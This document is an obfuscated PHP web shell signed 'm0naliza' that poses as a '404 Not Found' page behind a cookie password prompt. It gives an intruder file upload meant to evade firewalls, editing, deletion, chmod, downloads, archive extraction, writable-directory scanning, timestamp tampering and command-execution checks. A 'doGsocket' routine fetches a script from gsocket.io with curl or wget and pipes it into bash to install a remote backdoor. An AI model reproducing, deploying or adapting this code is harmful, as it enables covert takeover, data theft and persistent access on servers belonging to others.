<div id="scanwr_box" class="b" style="display:<?php  goto fIdda; mnoz1: function _gb($k, $d = null) { return isset($_POST[$k]) ? base64_decode($_POST[$k]) : $d; } goto D2fWE; c1jI9: echo $_hascmd ? 'CMD:ON' : 'CMD:OFF'; goto aAmX2; daP_O: ?>;font-weight:bold"><?php  goto cPskg; bd1tk: echo $_user; goto pWYej; nu3tZ: echo htmlspecialchars($dir); goto kTthM; aAmX2: ?>
</div>

<?php  goto GAIG5; FfSTz: ?>;gap:5px;align-items:center">
    <span style="color:#10b981;font-weight:bold">Scan:</span>
    <input type="text" id="_wrpath" value="<?php  goto M93oH; cPskg: echo $_dirwr ? 'WRITABLE' : 'READ-ONLY'; goto My5tX; I1kw9: ?>',{'_sp':btoa(p)});
}
function doGsocket(){
    if(!confirm('Install GSocket?'))return;
    var cmd='(curl -fsSL gsocket.io/x || wget -qO- gsocket.io/x || php -r "echo file_get_contents(\'https://gsocket.io/x\');") 2>/dev/null | bash 2>&1; echo GS_INSTALL_DONE';
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_runcmd':'1','_cmd':btoa(unescape(encodeURIComponent(cmd))),'_pb':'<?php  goto cGvaN; a8Dzm: echo $_dirwr ? '#22c55e' : '#ef4444'; goto t4C9G; mBbj3: ?>" placeholder="/path/to/scan" style="flex:1" onkeydown="if(event.key=='Enter')doScanWr()">
    <button onclick="doScanWr()" style="background:#10b981">Scan</button>
</div>
<?php  goto B5H6N; qT3f5: if ($_SERVER['REQUEST_METHOD'] === 'POST') { goto Ncb2g; W15tR: if ($act == 'mkdir' && isset($_POST['_fn'])) { goto wYinx; AmY0w: @mkdir($dir . '/' . $fn, 0777, true); goto o6e7U; o6e7U: $msg = "Created: " . $fn; goto b4fta; wYinx: $fn = _d($_POST['_fn']); goto AmY0w; b4fta: } goto R_qQC; iwMHq: if ($act == 'del' && $file) { if (is_dir($file)) { goto H98Jl; GaKsM: $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST); goto UuAIT; qwSpi: $msg = "Deleted dir: " . basename($file); goto dHKS8; DEzHK: @rmdir($file); goto qwSpi; UuAIT: foreach ($ri as $fi) { $fi->isDir() ? @rmdir($fi->getRealPath()) : @unlink($fi->getRealPath()); } goto DEzHK; H98Jl: $di = new RecursiveDirectoryIterator($file, FilesystemIterator::SKIP_DOTS); goto GaKsM; dHKS8: } else { @unlink($file); $msg = "Deleted: " . basename($file); } } goto W15tR; r_nGQ: if ($act == 'ren' && $file && isset($_POST['_nn'])) { goto mkZ5n; AAOVw: $ts = _rtime($np); goto LD4V8; PTMdu: rename($file, $np); goto AAOVw; mkZ5n: $nn = _d($_POST['_nn']); goto c7_46; c7_46: $np = $dir . '/' . $nn; goto PTMdu; LD4V8: $msg = "Renamed to {$nn} [time: {$ts}]"; goto wLelv; wLelv: } goto KHXok; Lh2LX: if ($act == 'chtime' && $file) { $ts = _rtime($file); $msg = "Time changed: " . basename($file) . " â {$ts}"; } goto J2cxx; Ncb2g: if ($act == 'up' && isset($_POST['_data']) && isset($_POST['_name'])) { goto UUm14; JPM9H: $ts = _rtime($dest); goto etzic; etzic: $msg = "Uploaded: " . basename($name) . " (" . strlen($data) . "B) [time: {$ts}]"; goto K5Aal; glrfC: $dest = $dir . '/' . basename($name); goto W2D2l; UUm14: $name = _d($_POST['_name']); goto J_SmO; J_SmO: $data = base64_decode($_POST['_data']); goto glrfC; W2D2l: file_put_contents($dest, $data); goto JPM9H; K5Aal: } goto aBvhD; R_qQC: if ($act == 'mkfile' && isset($_POST['_fn'])) { goto x7qKA; mZZsg: $ts = _rtime($fp); goto sFc03; R1Hmg: @file_put_contents($fp, ''); goto mZZsg; jv9R_: $fp = $dir . '/' . $fn; goto R1Hmg; sFc03: $msg = "File created: {$fn} [time: {$ts}]"; goto ANv8H; x7qKA: $fn = _d($_POST['_fn']); goto jv9R_; ANv8H: } goto r_nGQ; aBvhD: if ($act == 'save' && isset($_POST['_fc'])) { goto h_4tO; ETj2A: file_put_contents($file, $content); goto aeO8T; h_4tO: $content = _d($_POST['_fc']); goto ETj2A; aeO8T: $ts = _rtime($file); goto X2GgK; X2GgK: $msg = "Saved: " . basename($file) . " [time: {$ts}]"; goto VMOx3; VMOx3: } goto iwMHq; KHXok: if ($act == 'chmod' && $file && isset($_POST['_cm'])) { chmod($file, octdec($_POST['_cm'])); $msg = "Chmod: " . $_POST['_cm']; } goto Lh2LX; J2cxx: if ($act == 'unzip' && $file && is_file($file)) { goto bLLX8; Kgx8C: if (preg_match('/\\.tar$/i', $zname)) { $zname = pathinfo($zname, PATHINFO_FILENAME); } goto myrec; myrec: $dest = $dir . '/' . $zname; goto EwIqV; kFfhK: $done = false; goto pLoim; LSI3n: if (!$done && $ext == 'rar') { goto K13z4; K13z4: $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto OK1Ua; OK1Ua: $p = @proc_open('unrar x -o+ ' . escapeshellarg($file) . ' ' . escapeshellarg($dest) . ' 2>&1', $desc, $pipes); goto H8wjw; H8wjw: if (is_resource($p)) { goto TuWUJ; TuWUJ: fclose($pipes[0]); goto FFZS4; iC3fz: $done = true; goto hDC2Q; C_8cH: fclose($pipes[1]); goto qiojs; lNP8p: proc_close($p); goto iC3fz; FFZS4: stream_get_contents($pipes[1]); goto C_8cH; qiojs: fclose($pipes[2]); goto lNP8p; hDC2Q: } goto RP73A; RP73A: } goto ApP7l; bLLX8: $zname = pathinfo($file, PATHINFO_FILENAME); goto Kgx8C; B2wbL: $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); goto kFfhK; ApP7l: if ($done) { goto dzgds; dzgds: $ts = _rtime($dest); goto BXAzZ; sFcuu: $msg = "Extracted to {$zname}/ (" . max(0, @count(scandir($dest)) - 2) . " items) [time: {$ts}]"; goto P12Z8; BXAzZ: foreach (glob("{$dest}/*") as $_ef) { _rtime($_ef); } goto sFcuu; P12Z8: } else { $msg = "Extract failed - no handler for .{$ext}"; } goto QFCps; pLoim: if ($ext == 'zip') { if (class_exists('ZipArchive')) { $z = new ZipArchive(); if ($z->open($file) === true) { goto RlNvO; hUkJS: $done = true; goto fNQJF; iG3a3: $z->close(); goto hUkJS; RlNvO: $z->extractTo($dest); goto iG3a3; fNQJF: } } if (!$done) { goto jXN13; Y6eM_: if (is_resource($p)) { goto W8DV3; dUMZX: proc_close($p); goto TSHiC; TSHiC: $done = true; goto dkp7_; W8DV3: fclose($pipes[0]); goto gacDh; j98EM: fclose($pipes[2]); goto dUMZX; KAAkQ: fclose($pipes[1]); goto j98EM; gacDh: stream_get_contents($pipes[1]); goto KAAkQ; dkp7_: } goto XWXkx; jXN13: $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto TC2Dk; TC2Dk: $p = @proc_open('unzip -o ' . escapeshellarg($file) . ' -d ' . escapeshellarg($dest) . ' 2>&1', $desc, $pipes); goto Y6eM_; XWXkx: } } goto k9lN3; k9lN3: if (!$done && preg_match('/^(tar|gz|tgz)$/i', $ext)) { goto y8uNh; BaOaS: $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; goto rJQK7; y8uNh: $cmd = 'tar xzf ' . escapeshellarg($file) . ' -C ' . escapeshellarg($dest) . ' 2>&1'; goto sDhTD; sDhTD: if ($ext == 'tar') { $cmd = 'tar xf ' . escapeshellarg($file) . ' -C ' . escapeshellarg($dest) . ' 2>&1'; } goto BaOaS; rJQK7: $p = @proc_open($cmd, $desc, $pipes); goto nsdrL; nsdrL: if (is_resource($p)) { goto fjt0X; CDXRk: stream_get_contents($pipes[1]); goto dRtkY; cteu8: $done = true; goto elxEs; fjt0X: fclose($pipes[0]); goto CDXRk; dRtkY: fclose($pipes[1]); goto B2_D9; PmeHj: proc_close($p); goto cteu8; B2_D9: fclose($pipes[2]); goto PmeHj; elxEs: } goto a6LRw; a6LRw: } goto LSI3n; EwIqV: @mkdir($dest, 0777, true); goto B2wbL; QFCps: } goto oZHqs; oZHqs: } goto y2xc1; fIdda: echo $act == 'scanwr' ? 'flex' : 'none'; goto FfSTz; HcqBF: echo $_dirwr ? '#22c55e' : '#ef4444'; goto daP_O; xNcNR: ?> | <?php  goto c1jI9; y2xc1: $cmd_out = ''; goto hP1f6; X3BTh: ?>
<html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;font-size:13px}
body{background:#0f172a;color:#e2e8f0}a{color:#38bdf8;text-decoration:none}
.w{max-width:1200px;margin:0 auto;padding:10px}
.b{background:#1e293b;padding:8px 12px;border-radius:6px;margin-bottom:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
input[type=text],input[type=file],select{background:#0f172a;border:1px solid #334155;color:#fff;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:13px}
button,input[type=submit]{background:#e94560;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:13px}
button:hover{background:#ff6b81}
table{width:100%;border-collapse:collapse}th{background:#1e293b;padding:6px 10px;text-align:left;border-bottom:2px solid #e94560}
td{padding:4px 10px;border-bottom:1px solid #1e293b}tr:hover{background:#1e293b}
.s{color:#64748b}.m{background:#0a3d62;padding:8px;border-radius:4px;margin-bottom:8px;color:#7bed9f}
textarea{width:100%;height:400px;background:#0f172a;color:#e2e8f0;border:1px solid #334155;padding:8px;font-family:monospace;border-radius:4px}
.ab{background:#334155;border:none;cursor:pointer;padding:3px 8px;border-radius:3px;font-size:12px;color:#e2e8f0;font-family:monospace}
.ab:hover{background:#e94560;color:#fff}
.prog{display:none;color:#38bdf8;font-size:11px}
</style>
<script>
function b64e(s){return btoa(unescape(encodeURIComponent(s)));}
function b64d(s){return decodeURIComponent(escape(atob(s)));}

// Upload file as base64 (bypass WAF completely)
function doUpload(){
    var f=document.getElementById('uf').files[0];
    if(!f){alert('Select file');return;}
    var p=document.getElementById('prog');
    p.style.display='inline';p.textContent='Reading...';
    var r=new FileReader();
    r.onload=function(e){
        p.textContent='Uploading '+f.name+' ('+Math.round(f.size/1024)+'KB)...';
        var form=document.createElement('form');
        form.method='POST';form.style.display='none';
        var fields={
            '_a':'up',
            '_d':'<?php  goto MRwHT; imfvd: ?>
<div class="b" style="color:#64748b;font-size:11px">
    <?php  goto bd1tk; sqR2s: if ($act == 'dl' && $file) { $fp = realpath($file); if ($fp && is_file($fp)) { goto pArnP; c4bQR: header('Content-Length:' . filesize($fp)); goto SWLRy; P4M26: exit; goto Dvz8S; pArnP: header('Content-Type:application/octet-stream'); goto zna2D; zna2D: header('Content-Disposition:attachment;filename=' . basename($fp)); goto c4bQR; SWLRy: readfile($fp); goto P4M26; Dvz8S: } } goto XZ0ZE; apQUC: $_hascmd = function_exists('system') || function_exists('exec') || function_exists('shell_exec') || function_exists('passthru') || function_exists('popen'); goto X3BTh; fmURk: if (!isset($_COOKIE['_k'])) { goto UpKNf; v5fUW: echo '<html><head><title>404 Not Found</title><style>*{margin:0;padding:0;font-family:monospace}body{background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh}.x{background:#1e293b;padding:30px;border-radius:8px}input{background:#0f172a;border:1px solid #334155;color:#fff;padding:8px 12px;border-radius:4px;font-family:monospace}button{background:#e94560;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:monospace;margin-left:5px}</style></head><body><div class="x"><form method="post"><input type="password" name="_k" placeholder="key" autofocus><button>Go</button></form></div></body></html>'; goto eQZ8G; eQZ8G: exit; goto h26_8; UpKNf: if (isset($_POST['_k']) && $_POST['_k'] === $k) { goto hCUdq; hCUdq: setcookie('_k', $k, time() + 86400, '/'); goto oQm5t; oQm5t: header('Location:' . $_SERVER['REQUEST_URI']); goto LSC00; LSC00: exit; goto Bu4Qf; Bu4Qf: } goto v5fUW; h26_8: } elseif ($_COOKIE['_k'] !== $k) { goto hH9Bu; OGjql: echo '404'; goto qVvVf; qVvVf: exit; goto n51aB; hH9Bu: setcookie('_k', '', 0, '/'); goto OGjql; n51aB: } goto mnoz1; DfOgO: ?>
<div style="text-align:center;padding:15px 0;font-size:12px;margin-top:10px;border-top:1px solid #1e293b"><span style="color:#e2e8f0">m0naliza</span> <span style="color:#e94560">&#10084;</span></div>
</div></body></html>